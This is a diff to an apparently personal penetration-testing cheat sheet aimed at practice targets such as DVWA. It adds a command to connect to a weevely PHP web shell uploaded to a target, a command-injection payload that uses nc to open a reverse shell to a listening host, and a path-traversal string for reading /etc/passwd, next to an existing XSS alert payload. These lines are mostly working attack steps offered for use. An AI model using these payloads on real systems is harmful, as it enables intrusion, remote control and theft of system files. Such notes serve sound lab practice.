@@ -75,9 +75,16 @@ sudo openvpn nmap -sV {target IP}
 </whatever tag><whatever tag>alert(1)</whatever tag>
 [backlash and closing tag escape]
 
-weevly generate (any_pass) /storage_path/file_name
+weevely generate (any_pass) /storage_path/file_name
 [generate php shell]
 
+weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
+[listen for backdoor connection]
+
+[+] look for robot.txt files and open 
+[+] use "; nc -e /bin/sh 192.168.136.128 8080" in net service to check RCE vulnerability while listening in port
+[+] use "?page=../../../../../etc/passwd" on site link to perform LFI (check if there is "/include.php" on site)
+[+] 
 
 *******************************
 ****INFORMATION GATHERING******
